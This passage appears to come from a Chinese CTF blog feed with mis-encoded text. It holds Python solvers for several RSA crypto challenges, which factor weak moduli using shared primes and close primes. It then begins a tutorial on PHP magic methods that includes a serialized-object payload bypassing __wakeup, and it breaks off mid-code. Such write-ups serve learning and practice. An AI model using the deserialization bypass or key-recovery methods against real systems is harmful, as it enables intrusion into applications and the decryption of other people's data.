punctuation">,</span> s1<span class="token punctuation">,</span> n<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>message2<span class="token punctuation">,</span> s2<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> n<span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="SWPU-2020-happy"><a href="#SWPU-2020-happy" class="headerlink" title="[SWPU 2020]happy"></a>[SWPU 2020]happy</h1><p>cçš„å€¼åå¤šäº†ä¸ªå¤§å†™Lï¼Œç›´æ¥åˆ æ‰å³å¯ï¼Œæœ›å‘¨çŸ¥</p><blockquote><p>a &#x3D; q + q * p^3 &#x3D; q * (1 + p^3) &#x3D; q * (1 + p) * (1 - p + p^2)</p><p>b &#x3D; q * p + q * p^2 &#x3D; q * (1 + p) * p</p></blockquote><p>ç”±æ­¤å¯è§ï¼Œaå’Œbçš„æœ€å¤§å…¬çº¦æ•°ä¸º<code>q*(1+p)</code>ï¼Œæ‰€ä»¥æœ‰</p><blockquote><p>q*(1+p) &#x3D; gcd(a, b)</p><p>p &#x3D; b &#x2F; q*(1+p)</p><p>q &#x3D; b &#x2F; (1+p^3)</p></blockquote><p>æ‰€ä»¥æœ‰</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> gmpy2c <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">0x7a7e031f14f6b6c3292d11a41161d2491ce8bcdc67ef1baa9e</span><span class="token punctuation">)</span>e <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">0x872a335</span><span class="token punctuation">)</span>a <span class="token operator">=</span><span class="token number">1285367317452089980789441829580397855321901891350429414413655782431779727560841427444135440068248152908241981758331600586</span>b <span class="token operator">=</span> <span class="token number">1109691832903289208389283296592510864729403914873734836011311325874120780079555500202475594</span>gift <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>gcd<span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span>p <span class="token operator">=</span> b <span class="token operator">//</span> giftq <span class="token operator">=</span> a <span class="token operator">//</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">+</span>p<span class="token operator">**</span><span class="token number">3</span><span class="token punctuation">)</span>n <span class="token operator">=</span> p <span class="token operator">*</span> qphi <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> phi<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="SWPUCTF-2021-æ–°ç”Ÿèµ›-crypto4"><a href="#SWPUCTF-2021-æ–°ç”Ÿèµ›-crypto4" class="headerlink" title="[SWPUCTF 2021 æ–°ç”Ÿèµ›]crypto4"></a>[SWPUCTF 2021 æ–°ç”Ÿèµ›]crypto4</h1><blockquote><p>ç”±é¢˜å¯çŸ¥ï¼Œp å’Œ qéå¸¸æ¥è¿‘ï¼Œè¿™é€‚ç”¨äºè´¹é©¬å®šç†</p><p>ç›´æ¥å°†nå¼€å¹³æ–¹å†å–é™„è¿‘è´¨æ•°ï¼Œåˆ¤æ–­ç›¸ä¹˜æ˜¯å¦ç­‰äºnå°±å¯ä»¥æ±‚å‡ºpå’Œq</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2n <span class="token operator">=</span> <span class="token number">52147017298260357180329101776864095134806848020663558064141648200366079331962132411967917697877875277103045755972006084078559453777291403087575061382674872573336431876500128247133861957730154418461680506403680189755399752882558438393107151815794295272358955300914752523377417192504702798450787430403387076153</span>p <span class="token operator">=</span> q <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> n <span class="token operator">!=</span> p <span class="token operator">*</span> q<span class="token punctuation">:</span>    q <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>next_prime<span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>n<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    p <span class="token operator">=</span> n <span class="token operator">//</span> q<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'p = '</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'q = '</span><span class="token punctuation">,</span> q<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ±‚å‡ºäº†på’Œqæ¥ä¸‹æ¥å°±æ˜¯æ­£å¸¸æµç¨‹ï¼Œæœ€ç»ˆpayloadï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> gmpy2flag <span class="token operator">=</span> <span class="token number">10227915341268619536932290456122384969242151167487654201363877568935534996454863939953106193665663567559506242151019201314446286458150141991211233219320700112533775367958964780047682920839507351492644735811096995884754664899221842470772096509258104067131614630939533042322095150722344048082688772981180270243</span>n <span class="token operator">=</span> <span class="token number">52147017298260357180329101776864095134806848020663558064141648200366079331962132411967917697877875277103045755972006084078559453777291403087575061382674872573336431876500128247133861957730154418461680506403680189755399752882558438393107151815794295272358955300914752523377417192504702798450787430403387076153</span>e <span class="token operator">=</span> <span class="token number">65537</span>q <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>next_prime<span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>n<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>p <span class="token operator">=</span> n <span class="token operator">//</span> qn_ <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> n_<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>flag<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="ç¾ŠåŸæ¯-2021-Bigrsa"><a href="#ç¾ŠåŸæ¯-2021-Bigrsa" class="headerlink" title="[ç¾ŠåŸæ¯ 2021]Bigrsa"></a>[ç¾ŠåŸæ¯ 2021]Bigrsa</h1><p>æ‰“å¼€é™„ä»¶</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> flag <span class="token keyword">import</span> <span class="token operator">*</span>n1 <span class="token operator">=</span> <span class="token number">103835296409081751860770535514746586815395898427260334325680313648369132661057840680823295512236948953370895568419721331170834557812541468309298819497267746892814583806423027167382825479157951365823085639078738847647634406841331307035593810712914545347201619004253602692127370265833092082543067153606828049061</span>n2 <span class="token operator">=</span> <span class="token number">115383198584677147487556014336448310721853841168758012445634182814180314480501828927160071015197089456042472185850893847370481817325868824076245290735749717384769661698895000176441497242371873981353689607711146852891551491168528799814311992471449640014501858763495472267168224015665906627382490565507927272073</span>e <span class="token operator">=</span> <span class="token number">65537</span>m <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>c <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n1<span class="token punctuation">)</span>c <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n2<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c = %d"</span> <span class="token operator">%</span> c<span class="token punctuation">)</span><span class="token comment"># output</span><span class="token comment"># c = 60406168302768860804211220055708551816238816061772464557956985699400782163597251861675967909246187833328847989530950308053492202064477410641014045601986036822451416365957817685047102703301347664879870026582087365822433436251615243854347490600004857861059245403674349457345319269266645006969222744554974358264</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">næ˜¯æ¨¡  eæ˜¯å…¬é’¥  cæ˜¯å¯†æ–‡  mæ˜¯æ˜æ–‡  dæ˜¯ç§é’¥<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>å·²çŸ¥çš„æ˜¯ä¸¤ä¸ªæ¨¡n1n2ï¼Œå…¬é’¥eå’Œå¯†æ–‡c</li></ul><p>æ ¹æ®ä¸¤ä¸ªæ¨¡æ±‚å¾—på’Œqï¼ˆpğŸ˜­qï¼‰</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># æ±‚ä¸¤ä¸ªæ¨¡çš„æœ€å¤§å…¬çº¦æ•°</span>p <span class="token operator">=</span> GCD<span class="token punctuation">(</span>n1<span class="token punctuation">,</span> n2<span class="token punctuation">)</span><span class="token comment"># æ±‚q1å’Œq2</span>q1 <span class="token operator">=</span> n1 <span class="token operator">//</span> pq2 <span class="token operator">=</span> n2 <span class="token operator">//</span> p<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç”±æ­¤å¯å¾—æ¬§æ‹‰å‡½æ•°çš„å€¼</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># æ±‚æ¬§æ‹‰å‡½æ•°å€¼</span>_n1 <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q1 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>_n2 <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q2 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>å†æ±‚å¾—ç§é’¥</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># æ±‚ç§é’¥</span>d1 <span class="token operator">=</span> inverse<span class="token punctuation">(</span>e<span class="token punctuation">,</span> _n1<span class="token punctuation">)</span>d2 <span class="token operator">=</span> inverse<span class="token punctuation">(</span>e<span class="token punctuation">,</span> _n2<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>å› ä¸ºæ˜æ–‡æ˜¯å…ˆååˆ†ä¸¤æ¬¡åŠ å¯†çš„ï¼Œæ‰€ä»¥å…ˆç”¨d2è§£</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d2<span class="token punctuation">,</span> n2<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> d1<span class="token punctuation">,</span> n1<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æœ€åè½¬æ¢ä¸€ä¸‹</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æœ€ç»ˆpayload</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>n1 <span class="token operator">=</span> <span class="token number">103835296409081751860770535514746586815395898427260334325680313648369132661057840680823295512236948953370895568419721331170834557812541468309298819497267746892814583806423027167382825479157951365823085639078738847647634406841331307035593810712914545347201619004253602692127370265833092082543067153606828049061</span>n2 <span class="token operator">=</span> <span class="token number">115383198584677147487556014336448310721853841168758012445634182814180314480501828927160071015197089456042472185850893847370481817325868824076245290735749717384769661698895000176441497242371873981353689607711146852891551491168528799814311992471449640014501858763495472267168224015665906627382490565507927272073</span>e <span class="token operator">=</span> <span class="token number">65537</span>c <span class="token operator">=</span> <span class="token number">60406168302768860804211220055708551816238816061772464557956985699400782163597251861675967909246187833328847989530950308053492202064477410641014045601986036822451416365957817685047102703301347664879870026582087365822433436251615243854347490600004857861059245403674349457345319269266645006969222744554974358264</span><span class="token comment"># æ±‚ä¸¤ä¸ªæ¨¡çš„æœ€å¤§å…¬çº¦æ•°</span>p <span class="token operator">=</span> GCD<span class="token punctuation">(</span>n1<span class="token punctuation">,</span> n2<span class="token punctuation">)</span><span class="token comment"># æ±‚q1å’Œq2</span>q1 <span class="token operator">=</span> n1 <span class="token operator">//</span> pq2 <span class="token operator">=</span> n2 <span class="token operator">//</span> p<span class="token comment"># æ±‚æ¬§æ‹‰å‡½æ•°å€¼</span>_n1 <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q1 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>_n2 <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q2 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token comment"># æ±‚ç§é’¥</span>d1 <span class="token operator">=</span> inverse<span class="token punctuation">(</span>e<span class="token punctuation">,</span> _n1<span class="token punctuation">)</span>d2 <span class="token operator">=</span> inverse<span class="token punctuation">(</span>e<span class="token punctuation">,</span> _n2<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>d2<span class="token punctuation">)</span><span class="token punctuation">,</span> n2<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> d1<span class="token punctuation">,</span> n1<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="GWCTF-2019-babyRSA"><a href="#GWCTF-2019-babyRSA" class="headerlink" title="[GWCTF 2019]babyRSA"></a>[GWCTF 2019]babyRSA</h1><p>å…ˆé€šè¿‡Næ±‚på’Œq</p><blockquote><p>å› ä¸ºpå’Œqæä¸ºæ¥è¿‘æ‰€ä»¥ç›´æ¥å¼€æ–¹å–å¾—på†ç”¨<code>gmpy2.next_prime</code>å‡½æ•°å–å€¼å³å¯</p></blockquote><p>è®¡ç®—å¾—åˆ°ç§é’¥dåï¼Œå…ˆæ±‚å¾—c1c2ï¼Œç„¶åæœ‰ï¼š</p><blockquote><p>c1 &#x3D; F1 + F2</p><p>c2 &#x3D; F1^3 + F2^3</p><p>ç”±æ­¤å¯å¾—ï¼š</p><p>3 * c1 * F1^2 - 3 * c1^2 * F1 - c2 + c1^3 &#x3D; 0</p></blockquote><p>è§£æ–¹ç¨‹å³å¯</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> gmpy2<span class="token keyword">from</span> sympy <span class="token keyword">import</span> solve<span class="token keyword">from</span> sympy<span class="token punctuation">.</span>abc <span class="token keyword">import</span> xN<span class="token operator">=</span><span class="token number">636585149594574746909030160182690866222909256464847291783000651837227921337237899651287943597773270944384034858925295744880727101606841413640006527614873110651410155893776548737823152943797884729130149758279127430044739254000426610922834573094957082589539445610828279428814524313491262061930512829074466232633130599104490893572093943832740301809630847541592548921200288222432789208650949937638303429456468889100192613859073752923812454212239908948930178355331390933536771065791817643978763045030833712326162883810638120029378337092938662174119747687899484603628344079493556601422498405360731958162719296160584042671057160241284852522913676264596201906163</span>m1<span class="token operator">=</span><span class="token number">90009974341452243216986938028371257528604943208941176518717463554774967878152694586469377765296113165659498726012712288670458884373971419842750929287658640266219686646956929872115782173093979742958745121671928568709468526098715927189829600497283118051641107305128852697032053368115181216069626606165503465125725204875578701237789292966211824002761481815276666236869005129138862782476859103086726091860497614883282949955023222414333243193268564781621699870412557822404381213804026685831221430728290755597819259339616650158674713248841654338515199405532003173732520457813901170264713085107077001478083341339002069870585378257051150217511755761491021553239</span>m2<span class="token operator">=</span><span class="token number">487443985757405173426628188375657117604235507936967522993257972108872283698305238454465723214226871414276788912058186197039821242912736742824080627680971802511206914394672159240206910735850651999316100014691067295708138639363203596244693995562780286637116394738250774129759021080197323724805414668042318806010652814405078769738548913675466181551005527065309515364950610137206393257148357659666687091662749848560225453826362271704292692847596339533229088038820532086109421158575841077601268713175097874083536249006018948789413238783922845633494023608865256071962856581229890043896939025613600564283391329331452199062858930374565991634191495137939574539546</span>e<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">0x10001</span><span class="token punctuation">)</span>p <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>next_prime<span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>N<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>q <span class="token operator">=</span> N <span class="token operator">//</span> pphi <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> phi<span class="token punctuation">)</span>c1 <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m1<span class="token punctuation">,</span> d<span class="token punctuation">,</span> N<span class="token punctuation">)</span>  <span class="token comment"># c1 = F1+F2 </span>c2 <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m2<span class="token punctuation">,</span> d<span class="token punctuation">,</span> N<span class="token punctuation">)</span>  <span class="token comment"># c2 = F1^3+F2^3 = (F1+F2)(F1^2+F1*F2+F2^2) = c1(F1^2+F1*F2+F2^2)</span><span class="token comment"># 3 * c1 * F1^2 - 3 * c1^2 * F1 - c2 + c1^3 = 0</span>res <span class="token operator">=</span> solve<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token operator">*</span>c1<span class="token operator">*</span><span class="token builtin">pow</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">3</span><span class="token operator">*</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c1<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">*</span>x<span class="token operator">-</span>c2<span class="token operator">+</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c1<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">)</span>F2 <span class="token operator">=</span> res<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>F1 <span class="token operator">=</span> c1 <span class="token operator">-</span> F2m <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span>F1<span class="token punctuation">)</span> <span class="token operator">+</span> long_to_bytes<span class="token punctuation">(</span>F2<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Crypot </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PHPä¸­å¸¸ç”¨çš„é­”æœ¯æ–¹æ³•</title>
      <link href="/2023/09/21/PHP%E4%B8%AD%E5%B8%B8%E7%94%A8%E7%9A%84%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/"/>
      <url>/2023/09/21/PHP%E4%B8%AD%E5%B8%B8%E7%94%A8%E7%9A%84%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h2 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup"></a>__wakeup</h2><p><strong>æ‰§è¡Œunserialize()æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°</strong></p><p><code>unserialize()</code> ä¼šæ£€æŸ¥æ˜¯å¦å­˜åœ¨ä¸€ä¸ª <code>__wakeup()</code> æ–¹æ³•ã€‚å¦‚æœå­˜åœ¨ï¼Œåˆ™ä¼šå…ˆè°ƒç”¨ <code>__wakeup</code> æ–¹æ³•ï¼Œé¢„å…ˆå‡†å¤‡å¯¹è±¡éœ€è¦çš„èµ„æºã€‚</p><p>å¦‚ä½•ç»•è¿‡wakeupå‡½æ•°ï¼šåªè¦ååºåˆ—åŒ–æ—¶å¯¹è±¡å‚æ•°å¤§äºåŸå‚æ•°æ•°é‡å³å¯ç»•è¿‡,ä¾‹å¦‚</p><pre class="line-numbers language-none"><code class="language-none">æˆ‘ä»¬åªéœ€è¦æŠŠå¯¹è±¡åŸæ¥å±æ€§å€¼æ¯”åŸæ¥çš„å¤§å°±è¡Œæˆ‘ä»¬æŠŠ1æ”¹æˆ2ä¿®æ”¹å‰:O:6:â€œsercetâ€:1:&#123;s:12:â€œ%00sercet%00fileâ€;s:8:â€œflag.phpâ€;&#125;ä¿®æ”¹å:O:6:â€œsercetâ€:2:&#123;s:12:â€œ%00sercet%00fileâ€;s:8:â€œflag.phpâ€;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="destruct"><a href="#destruct" class="headerlink" title="__destruct"></a>__destruct</h2><p><strong>è¿™æ˜¯ææ„å‡½æ•°ï¼Œè„šæœ¬è¿è¡Œç»“æŸä¹‹å‰ä¼šè°ƒç”¨å¯¹è±¡çš„ææ„å‡½æ•°</strong></p><h2 id="construct"><a href="#construct" class="headerlink" title="__construct"></a>__construct</h2><p><strong>è¿™æ˜¯æ„é€ å‡½æ•°ï¼Œå½“ä½¿ç”¨ new å…³é”®å­—å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œæ„é€ å‡½æ•°å°†ä¼šè‡ªåŠ¨è°ƒç”¨</strong></p><h2 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString"></a>__toString</h2><p><strong>å°†å½“å‰ç±»çš„ç±»åå½“ä½œå˜é‡æ—¶è‡ªåŠ¨è°ƒç”¨</strong></p><p>æ­¤æ–¹æ³•å¿…é¡»è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¦åˆ™å°†å‘å‡ºä¸€æ¡ <code>E_RECOVERABLE_ERROR</code> çº§åˆ«çš„è‡´å‘½é”™è¯¯ã€‚</p><ul><li>å¯¹ä¸€ä¸ªå¯¹è±¡è¿›è¡Œechoæ“ä½œæˆ–è€…printæ“ä½œä¼šè§¦å‘__toString;</li><li>å£°æ˜çš„å˜é‡èµ‹å€¼ä¸ºå¯¹è±¡åä¸å­—ç¬¦ä¸²åšå¼±ç±»å‹æ¯”è¾ƒçš„æ—¶å€™å°±èƒ½è§¦å‘__toString;</li><li>å£°æ˜çš„å˜é‡èµ‹å€¼ä¸ºå¯¹è±¡åè¿›è¡Œæ­£åˆ™åŒ¹é…çš„æ—¶å€™å°±èƒ½è§¦å‘__toString;</li><li>å£°æ˜çš„å˜é‡è¢«èµ‹å€¼ä¸ºå¯¹è±¡åè¿›è¡Œstrolowerçš„æ—¶å€™å°±èƒ½è§¦å‘__toString;</li></ul><h2 id="call"><a href="#call" class="headerlink" title="__call"></a>__call</h2><p><strong>åœ¨å¯¹è±¡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å­˜åœ¨çš„æ–¹æ³•æ—¶è‡ªåŠ¨è°ƒç”¨</strong></p><p>å½“ç¨‹åºå‘ç°å¯¹è±¡æ²¡æœ‰å®šä¹‰æŸä¸ªæ–¹æ³•æ—¶ï¼Œå°±ä¼šå°è¯•è°ƒç”¨åä¸º<code>__call</code>çš„æ–¹æ³•ï¼Œå¦‚æœå¯¹è±¡ä¸­æœ‰<code>__call</code>æ–¹æ³•ï¼Œåˆ™ä¼šè°ƒç”¨<code>__call</code>æ–¹æ³•ï¼ŒæŠŠä¸å­˜åœ¨çš„æ–¹æ³•åå’Œå‚æ•°ï¼Œä»¥æ•°ç»„çš„å½¢å¼ä¼ é€’ç»™<code>__call</code>æ–¹æ³•ã€‚</p><h2 id="get"><a href="#get" class="headerlink" title="__get"></a>__get</h2><p><strong>è®¿é—®ç±»ä¸­çš„ç§æœ‰æˆå‘˜æ—¶ï¼Œå¦‚æœå®šä¹‰äº†æ­¤æ–¹æ³•ï¼Œè‡ªåŠ¨è°ƒç”¨</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Person</span><span class="token punctuation">&#123;</span><span class="token comment">/*å°è£…ç§æœ‰æˆå‘˜å±æ€§*/</span><span class="token keyword">private</span> <span class="token variable">$name</span><span class="token operator">=</span><span class="token string single-quoted-string">'å¼ ä¸‰'</span><span class="token punctuation">;</span><span class="token keyword">private</span> <span class="token variable">$sex</span><span class="token operator">=</span><span class="token string single-quoted-string">'ç”·'</span><span class="token punctuation">;</span><span class="token keyword">private</span> <span class="token variable">$age</span><span class="token operator">=</span><span class="token number">12</span><span class="token punctuation">;</span><span class="token comment">/*__get()æ–¹æ³•ç”¨æ¥è·å–ç§æœ‰å±æ€§*/</span><span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$property_name</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'åœ¨ç›´æ¥è·å–ç§æœ‰æˆå‘˜å±æ€§å¾—æ—¶å€™ï¼Œè‡ªåŠ¨è°ƒç”¨äº†è¿™ä¸ª__get()æ–¹æ³•&lt;br/>'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token variable">$property_name</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token 